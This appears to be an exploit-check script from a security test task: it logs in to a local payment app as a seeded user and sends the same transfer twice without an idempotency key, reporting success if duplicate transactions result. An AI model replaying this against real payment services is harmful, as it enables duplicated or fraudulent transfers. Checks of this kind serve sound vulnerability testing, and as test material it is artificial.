import os
import sys
import requests

def main():
    base_url = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

    # Step 1: authenticate as seeded user alice
    try:
        login_resp = requests.post(
            f'{base_url}/api/auth/login',
            json={'username': 'alice', 'password': 'alice-pw'},
            timeout=5
        )
    except Exception as e:
        print(f'EXPLOIT_FAIL: login request error: {e}')
        sys.exit(0)

    if login_resp.status_code != 200:
        print(f'EXPLOIT_FAIL: login failed with status {login_resp.status_code}')
        sys.exit(0)

    token = login_resp.json().get('token')
    if not token:
        print('EXPLOIT_FAIL: no token in login response')
        sys.exit(0)

    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    body = {'fromAccount': 'alice', 'toAccount': 'bob', 'amount': 10.00}

    # Step 2: send the same transfer request twice without Idempotency-Key
    try:
        r1 = requests.post(f'{base_url}/api/payments/transfer', json=body, headers=headers, timeout=5)
        r2 = requests.post(f'{base_url}/api/payments/transfer', json=body, headers=headers, timeout=5)
    except Exception as e:
        print(f'EXPLOIT_FAIL: transfer request error: {e}')
        sys.exit(0)

    if r1.status_code != 200 or r2.status_code != 200:
        print(f'EXPLOIT_FAIL: transfer returned non-200 (r1={r1.status_code} r2={r2.status_code})')
        sys.exit(0)

    tx1 = r1.json().get('transaction_id', '')
    tx2 = r2.json().get('transaction_id', '')

    if tx1 and tx2 and tx1 != tx2:
        print(f'EXPLOIT_SUCCESS: duplicate transfers created id1={tx1} id2={tx2}')
    else:
        print(f'EXPLOIT_FAIL: transactions not duplicated (tx1={tx1!r} tx2={tx2!r})')

    sys.exit(0)

main()

